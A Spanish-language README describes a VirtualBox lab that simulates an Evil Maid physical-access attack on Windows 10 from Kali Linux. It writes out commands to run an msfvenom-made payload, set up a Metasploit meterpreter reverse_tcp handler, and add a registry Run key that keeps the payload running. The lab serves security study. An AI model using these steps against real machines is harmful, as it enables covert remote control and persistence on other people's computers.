# Evil-Maid
EVIL MAID ATTACK - LABORATORIO VIRTUAL📌 

DescripciónEste proyecto documenta la simulación de un ataque Evil Maid en un entorno virtual usando VirtualBox. Se busca demostrar cómo un atacante con acceso físico a una máquina puede comprometer la seguridad de un sistema operativo mediante un ataque persistente.


🔧 RequisitosPara replicar este laboratorio, se necesita:
VirtualBox con Extension Pack instalado.
Kali Linux (Atacante).
Windows 10 (Víctima).
Tiny Core Linux (Soporte de persistencia).
USB Booteable con herramientas de ataque.
Plop Boot Manager (Opcional, para boot desde USB en VirtualBox).

______________________________________________________________________________________________________________________________________________________________
🚀 Configuración del Laboratorio
1️⃣ Configurar VirtualBoxInstalar VirtualBox y su Extension Pack.
Crear tres máquinas virtuales:
Kali Linux (Atacante)
Windows 10 (Víctima)
Tiny Core Linux (Soporte/Persistencia)
Configurar el orden de arranque para permitir boot desde USB/CD.

________________________________________________________________________________________________________________________________________________________________
2️⃣ Crear USB BooteableUsar rufus o dd para crear un USB booteable con Kali Linux.
Verificar que el USB es detectado con lsusb.
Agregar la USB a VirtualBox usando:
VBoxManage internalcommands createrawvmdk -filename C:\usb.vmdk -rawdisk \.\PhysicalDriveX(Reemplazar X con el número de la USB en diskpart).

_______________________________________________________________________________________________________________________________________________________________
3️⃣ Realizar el Ataque Evil MaidArrancar Windows 10 desde Kali Linux o Tiny Core.
Copiar y ejecutar el payload malicioso:
start C:\Windows\System32\evilmaid.exe

_______________________________________________________________________________________________________________________________________________________________
Configurar una sesión de Meterpreter en Kali Linux:
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_KALI>
set LPORT 4444

_______________________________________________________________________________________________________________________________________________________________
exploitHacer persistente el payload:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evilmaid /t REG_SZ /d "C:\Windows\System32\evilmaid.exe"

_______________________________________________________________________________________________________________________________________________________________
📂 Archivos Incluidosevilmaid.exe 
- Payload generado con msfvenom.
usb.vmdk -Archivo VMDK para montar la USB en VirtualBox.
configuracion_lab.md - Instrucciones detalladas del laboratorio.

_______________________________________________________________________________________________________________________________________________________________
🔗 ReferenciasKali Linux - Metasploit
VirtualBox Manual
Plop Boot Manager

_______________________________________________________________________________________________________________________________________________________________
✨ CréditosProyecto desarrollado por Jordan Michael como parte del estudio de ataques físicos a sistemas operativos en entornos virtualizados.

_______________________________________________________________________________________________________________________________________________________________
📌 Nota: Este documento es solo para fines educativos. No debe ser utilizado en sistemas sin autorización.

_______________________________________________________________________________________________________________________________________________________________
